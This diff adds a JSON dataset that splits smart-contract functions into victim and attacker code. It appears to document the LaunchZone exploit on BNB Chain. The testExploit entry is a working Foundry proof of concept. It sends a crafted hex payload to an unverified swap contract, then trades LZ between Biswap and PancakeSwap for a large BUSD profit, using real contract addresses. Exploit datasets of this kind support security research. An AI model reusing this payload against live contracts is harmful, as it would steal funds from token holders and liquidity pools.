@@ -1,0 +1,149 @@
+[
+  {
+    "contract/interface": "UniRouterLike",
+    "source_type": "victim_contract",
+    "function_name": "getAmountsOut",
+    "original_code": "    function getAmountsOut(address factory, uint amountIn, address[] memory path) internal view returns (uint[] memory amounts) {\n        require(path.length >= 2, 'BiswapLibrary: INVALID_PATH');\n        amounts = new uint[](path.length);\n        amounts[0] = amountIn;\n        for (uint i; i < path.length - 1; i++) {\n            (uint reserveIn, uint reserveOut) = getReserves(factory, path[i], path[i + 1]);\n            amounts[i + 1] = getAmountOut(amounts[i], reserveIn, reserveOut, getSwapFee(factory, path[i], path[i + 1]));\n        }\n    }\n\n    // performs chained getAmountIn calculations on any number of pairs\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "UniRouterLike",
+    "source_type": "victim_contract",
+    "function_name": "swap",
+    "original_code": "    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external lock {\n        require(amount0Out > 0 || amount1Out > 0, 'Biswap: INSUFFICIENT_OUTPUT_AMOUNT');\n        (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings\n        require(amount0Out < _reserve0 && amount1Out < _reserve1, 'Biswap: INSUFFICIENT_LIQUIDITY');\n\n        uint balance0;\n        uint balance1;\n        { // scope for _token{0,1}, avoids stack too deep errors\n        address _token0 = token0;\n        address _token1 = token1;\n        require(to != _token0 && to != _token1, 'Biswap: INVALID_TO');\n        if (amount0Out > 0) _safeTransfer(_token0, to, amount0Out); // optimistically transfer tokens\n        if (amount1Out > 0) _safeTransfer(_token1, to, amount1Out); // optimistically transfer tokens\n        if (data.length > 0) IBiswapCallee(to).BiswapCall(msg.sender, amount0Out, amount1Out, data);\n        balance0 = IERC20(_token0).balanceOf(address(this));\n        balance1 = IERC20(_token1).balanceOf(address(this));\n        }\n        uint amount0In = balance0 > _reserve0 - amount0Out ? balance0 - (_reserve0 - amount0Out) : 0;\n        uint amount1In = balance1 > _reserve1 - amount1Out ? balance1 - (_reserve1 - amount1Out) : 0;\n        require(amount0In > 0 || amount1In > 0, 'Biswap: INSUFFICIENT_INPUT_AMOUNT');\n        { // scope for reserve{0,1}Adjusted, avoids stack too deep errors\n        uint _swapFee = swapFee;\n        uint balance0Adjusted = balance0.mul(1000).sub(amount0In.mul(_swapFee));\n        uint balance1Adjusted = balance1.mul(1000).sub(amount1In.mul(_swapFee));\n        require(balance0Adjusted.mul(balance1Adjusted) >= uint(_reserve0).mul(_reserve1).mul(1000**2), 'Biswap: K');\n        }\n\n        _update(balance0, balance1, _reserve0, _reserve1);\n        emit Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to);\n    }\n\n    // force balances to match reserves\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "UniRouterLike",
+    "source_type": "victim_contract",
+    "function_name": "swapExactTokensForTokens",
+    "original_code": "    function swapExactTokensForTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external returns (uint[] memory amounts);\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "LaunchZoneExploit",
+    "source_type": "attacker_contract",
+    "function_name": "IS_TEST",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "LaunchZoneExploit",
+    "source_type": "attacker_contract",
+    "function_name": "excludeArtifacts",
+    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "LaunchZoneExploit",
+    "source_type": "attacker_contract",
+    "function_name": "excludeContracts",
+    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "LaunchZoneExploit",
+    "source_type": "attacker_contract",
+    "function_name": "excludeSenders",
+    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "LaunchZoneExploit",
+    "source_type": "attacker_contract",
+    "function_name": "failed",
+    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "LaunchZoneExploit",
+    "source_type": "attacker_contract",
+    "function_name": "setUp",
+    "original_code": "    function setUp() public {\n        // select and fork bsc at 26024420\n        vm.createSelectFork(\"bsc\", 26_024_420 - 1); // previous block so still there is fund\n        LZ = ERC20Like(0x3B78458981eB7260d1f781cb8be2CaAC7027DbE2);\n        BUSD = ERC20Like(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);\n        BISWAPPair = ERC20Like(0xDb821BB482cfDae5D3B1A48EeaD8d2F74678D593);\n        BISWAPRouter = UniRouterLike(0x3a6d8cA21D1CF76F653A67577FA0D27453350dD8);\n        pancackeRouter = UniRouterLike(0x10ED43C718714eb63d5aA57B78B54704E256024E);\n\n        vm.label(BscexDeployer, \"BscexDeployer\");\n\n        vm.label(address(LZ), \"LZ\");\n        vm.label(address(BUSD), \"BUSD\");\n        vm.label(address(BISWAPPair), \"BISWAP\");\n        vm.label(address(BISWAPRouter), \"BISWAP Router\");\n        vm.label(attacker, \"attacker\");\n        vm.label(address(this), \"thisContract\");\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "LaunchZoneExploit",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifactSelectors",
+    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "LaunchZoneExploit",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifacts",
+    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "LaunchZoneExploit",
+    "source_type": "attacker_contract",
+    "function_name": "targetContracts",
+    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "LaunchZoneExploit",
+    "source_type": "attacker_contract",
+    "function_name": "targetInterfaces",
+    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "LaunchZoneExploit",
+    "source_type": "attacker_contract",
+    "function_name": "targetSelectors",
+    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "LaunchZoneExploit",
+    "source_type": "attacker_contract",
+    "function_name": "targetSenders",
+    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "LaunchZoneExploit",
+    "source_type": "attacker_contract",
+    "function_name": "testExploit",
+    "original_code": "    function testExploit() public {\n        console.log(\"Running on BSC at : \", block.number);\n\n        console.log(\"BscexDeployer LZ Balalnce\", LZ.balanceOf(BscexDeployer));\n        console.log(\"LZ allowance to swapXImp\", LZ.allowance(BscexDeployer, swapXImp) / 1e18);\n\n        //  lazy payload check the previous swapX PoC\n        //  swapX.call(abi.encodeWithSelector(0x4f1f05bc, swapPath, transferAmount, value, array, victims[i]));\n        //  calling unverified contract of swapXImp with payload containing swap\n        //  (bool success, bytes memory returndata) = swapXImpl.call{value: msg.value}(data);\n\n        bytes memory payload =\n            hex\"4f1f05bc00000000000000000000000000000000000000000000000000000000000000a0000000000000000000000000000000000000000000082da53fc059357f82f9b400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000dad254728a37d1e80c21afae688c64d0383cc30700000000000000000000000000000000000000000000000000000000000000020000000000000000000000003b78458981eb7260d1f781cb8be2caac7027dbe2000000000000000000000000e9e7cea3dedca5984780bafc599bd69add087d5600000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\";\n        (bool success,) = address(swapXImp).call(payload);\n        console.log(\"Payload delivered\", success);\n\n        console.log(\"BscexDeployer BUSD Balalnce\", BUSD.balanceOf(BscexDeployer) / 1e18);\n\n        // give attacker 50 BUSD\n        deal(address(BUSD), address(this), 50 * 1e18);\n\n        // get BUSD from attacker\n        console.log(\"attacker BUSD Balalnce\", BUSD.balanceOf(address(this)) / 1e18);\n\n        // approve router for 50 BUSD\n        BUSD.approve(address(BISWAPRouter), 50 * 1e18);\n\n        //get amount out for BUSD to LZ\n        // define path\n        address[] memory path = new address[](2);\n        path[0] = address(BUSD);\n        path[1] = address(LZ);\n\n        uint256[] memory amounts = BISWAPRouter.getAmountsOut(50 * 1e18, path);\n        console.log(\"amounts BUSD/LZ\", amounts[0] / 1e18, amounts[1] / 1e18);\n\n        // do the swap\n        BISWAPRouter.swapExactTokensForTokens(amounts[0], amounts[1], path, address(this), block.timestamp);\n\n        // at this point attack has 9_886_999 for 50 BUSD\n        console.log(\"attacker LZ Balalnce\", LZ.balanceOf(address(this)) / 1e18);\n\n        console.log(\"attacker BUSD Balalnce\", BUSD.balanceOf(address(this)) / 1e18);\n\n        // reverse swap on pancake\n        // building a  new path\n        address[] memory path2 = new address[](2);\n        path2[0] = address(LZ);\n        path2[1] = address(BUSD);\n\n        // get amount out for LZ to BUSD from pancackeRouter\n        uint256[] memory amounts2 = pancackeRouter.getAmountsOut(LZ.balanceOf(address(this)), path2);\n\n        console.log(\"amounts LZ/BUSD\", amounts2[0] / 1e18, amounts2[1] / 1e18);\n\n        // attacker gets 88,899 BUSD for 9,886,999 LZ which bought for 50 BUSD\n        // approve pancackeRouter for 9,886,999 LZ\n        LZ.approve(address(pancackeRouter), LZ.balanceOf(address(this)));\n\n        // do the swap\n        pancackeRouter.swapExactTokensForTokens(amounts2[0], amounts2[1], path2, address(this), block.timestamp);\n        // check current BSUSD balance\n        console.log(\"attacker BUSD Balalnce\", BUSD.balanceOf(address(this)) / 1e18);\n    }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ERC20Like",
+    "source_type": "victim_contract",
+    "function_name": "allowance",
+    "original_code": "  function allowance(address owner, address spender) external view returns (uint256) {\n    return _allowances[owner][spender];\n  }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ERC20Like",
+    "source_type": "victim_contract",
+    "function_name": "approve",
+    "original_code": "  function approve(address spender, uint256 amount) external returns (bool) {\n    _approve(_msgSender(), spender, amount);\n    return true;\n  }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ERC20Like",
+    "source_type": "victim_contract",
+    "function_name": "balanceOf",
+    "original_code": "  function balanceOf(address account) external view returns (uint256) {\n    return _balances[account];\n  }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ERC20Like",
+    "source_type": "victim_contract",
+    "function_name": "transfer",
+    "original_code": "  function transfer(address recipient, uint256 amount) external returns (bool) {\n    _transfer(_msgSender(), recipient, amount);\n    return true;\n  }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ERC20Like",
+    "source_type": "victim_contract",
+    "function_name": "transferFrom",
+    "original_code": "  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {\n    _transfer(sender, recipient, amount);\n    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"BEP20: transfer amount exceeds allowance\"));\n    return true;\n  }\n\n",
+    "description": ""
+  }
+]
